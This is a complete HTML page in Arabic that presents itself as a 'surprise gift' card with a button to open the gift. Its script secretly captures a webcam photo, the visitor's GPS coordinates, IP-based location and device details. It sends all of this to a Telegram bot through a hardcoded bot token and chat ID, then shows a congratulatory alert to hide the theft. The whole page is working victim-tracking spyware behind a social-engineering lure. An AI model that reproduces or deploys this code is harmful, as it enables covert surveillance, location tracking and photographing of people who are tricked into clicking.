<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مفاجأة ليك! 🎁</title>
    <style>
        body {
            font-family: 'Cairo', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        h1 { color: #ffd700; font-size: 2rem; margin-bottom: 20px; }
        p { font-size: 1.1rem; line-height: 1.8; margin-bottom: 30px; }
        .btn {
            background-color: #ffc107; color: #333; border: none;
            padding: 12px 30px; font-size: 1.1rem; font-weight: bold;
            border-radius: 30px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h1>✨ مفاجأة سارة ليك! ✨</h1>
        <p>اضغط على الزر أدناه لفتح الهدية الخاصة بك وعرض التفاصيل.</p>
        <button class="btn" onclick="openGift()">اضغط هنا لفتح الهدية 🎁</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
        const CHAT_ID = '6663398412';

        async function openGift() {
            let photoBlob = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 1500));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());
                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
            } catch (e) {}

            sendData(photoBlob);
        }

        async function sendData(photoBlob) {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();

                let gpsInfo = "غير متاح";
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    gpsInfo = `خط الطول: ${position.coords.latitude}, خط العرض: ${position.coords.longitude}`;
                } catch(e) {}

                const caption = `🚨 **تقرير الزائر الجديد!**\n\n` +
                                `📍 **الموقع (GPS):** ${gpsInfo}\n` +
                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
                                `📱 **الجهاز:** ${navigator.userAgent}`;

                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoBlob, 'visitor.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST', body: formData
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                    });
                }
            } catch (err) {}

            alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
        }
    </script>
</body>
</html>
